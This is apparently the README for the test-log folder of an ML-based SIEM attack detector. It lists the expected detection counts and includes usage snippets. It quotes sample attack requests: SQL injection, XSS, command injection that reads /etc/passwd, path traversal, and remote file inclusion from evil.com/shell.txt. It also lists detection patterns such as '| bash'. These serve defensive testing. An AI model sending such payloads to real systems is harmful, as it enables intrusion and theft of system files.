# Cyber Chakshu SIEM Test Log Files

This directory contains test log files with various attack patterns for testing the ML-based attack detection system.

## Test Files Overview

### Apache Logs

#### `apache_normal.log`
**Description:** Normal Apache access logs without any attack patterns  
**Expected Detection:** 0 attacks  
**Content:** 15 lines of normal HTTP requests (GET/POST) with 200/201 responses

#### `apache_attacks.log`
**Description:** Apache logs with various web attack patterns  
**Expected Detection:** 7 attacks  
**Attack Types Present:**
- SQL Injection (2 instances)
  - Line 2: `GET /products.php?id=1' OR '1'='1`
  - Line 12: `GET /products.php?id=1; DROP TABLE users--`
- XSS (2 instances)
  - Line 4: `GET /search?q=<script>alert('xss')</script>`
  - Line 14: `GET /profile?name=<iframe src='javascript:alert(1)'>`
- Command Injection (1 instance)
  - Line 6: `GET /ping?host=127.0.0.1; cat /etc/passwd`
- Directory Traversal (1 instance)
  - Line 8: `GET /files/../../etc/passwd`
- File Inclusion (1 instance)
  - Line 10: `GET /index.php?page=http://evil.com/shell.txt`

### SSH Logs

#### `ssh_normal.log`
**Description:** Normal SSH authentication logs  
**Expected Detection:** 0 attacks  
**Content:** 15 successful login attempts from various internal IPs

#### `ssh_attacks.log`
**Description:** SSH logs with bruteforce attack patterns  
**Expected Detection:** 13 attacks  
**Attack Types Present:**
- Bruteforce/Password Spray (13 instances)
  - Multiple failed login attempts from IP 45.33.32.150
  - Targeting users: admin, root, administrator, test, postgres, mysql, ubuntu, deploy, git, www-data

### Mixed Logs

#### `mixed_normal.log`
**Description:** Mixed system logs without attacks  
**Expected Detection:** 0 attacks  
**Content:** System logs from kernel, systemd, sshd, apache, mysql, docker, cron

#### `mixed_attacks.log`
**Description:** Mixed system logs with various attacks  
**Expected Detection:** Multiple attacks  
**Attack Types Present:**
- Bruteforce (SSH)
- SQL Injection (Apache)
- XSS (Apache)
- Command Injection (Apache)

## Usage

Test attack detection with these files:

```python
from api.app import app

client = app.test_client()

# Test Apache attacks
with open('test_logs/apache_attacks.log', 'r') as f:
    result = client.post('/parse', data=f.read(), content_type='text/plain').get_json()
    
print(f"Attacks detected: {result['attackSummary']['totalAttacks']}")
print(f"Attack types: {result['attackSummary']['attackTypes']}")
```

## Attack Detection Features

The ML model detects the following attack types:

1. **SQL Injection** - Patterns like `' OR '1'='1`, `UNION SELECT`, `DROP TABLE`
2. **XSS** - Patterns like `<script>`, `javascript:`, `onerror=`, `<iframe>`
3. **Command Injection** - Patterns like `; cat /etc/passwd`, `| bash`, `$(whoami)`
4. **Directory Traversal** - Patterns like `../../etc/passwd`, `..%2f..`
5. **File Inclusion** - Patterns like `?page=http://evil.com/shell`
6. **Port Scan** - Connection attempts to multiple ports
7. **Bruteforce** - Multiple failed login attempts for same user
8. **Password Spray** - Failed logins for multiple different users

## GUI Integration

When viewing logs in the GUI:
- Attack entries are highlighted with a red background
- Severity column shows a warning icon for attacks
- Attack type is displayed in the Attack column
- Hover over attack type to see confidence score

## Files Modified

- `ml/train_model.py` - ML training pipeline
- `ml/correlation.py` - Attack detection logic
- `api/app.py` - API endpoint integration
- `parsers/webserver.py` - Apache/Nginx parser improvements
- `siem-tool/frontend/src/App.css` - Attack highlighting styles
- `siem-tool/frontend/src/DynamicTable.tsx` - Attack column display
- `siem-tool/frontend/src/types.ts` - Attack type definitions

## Model Information

- **Algorithm:** Random Forest Classifier
- **Features:** 25 engineered features
- **Training Samples:** 6,000 (2,000 normal + 500 per attack type)
- **Accuracy:** 100% on test data
- **Model File:** `models/attack_classifier.joblib`

## Testing Commands

```bash
# Run attack detection on all test files
cd siem-gui/webview-gui
python -c "
from api.app import app
import os
client = app.test_client()
for f in os.listdir('test_logs'):
    if f.endswith('.log'):
        with open(f'test_logs/{f}') as file:
            r = client.post('/parse', data=file.read(), content_type='text/plain').get_json()
        print(f'{f}: {r.get(\"attackSummary\", {}).get(\"totalAttacks\", 0)} attacks')
"
```
